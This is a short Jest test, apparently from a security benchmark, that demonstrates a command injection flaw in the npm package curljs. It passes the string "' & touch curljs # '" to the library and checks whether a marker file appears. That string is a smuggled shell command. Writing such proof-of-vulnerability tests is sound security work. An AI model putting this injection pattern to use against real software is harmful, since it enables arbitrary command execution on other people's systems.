test("Command Injection in curljs", (done) => {
  expect.assertions(2);
  const a = require("curljs");
  const fs = require("fs");
  const path = "./curljs";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(process.env.SECBENCH_PAYLOAD || ("' & touch curljs # '"), function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
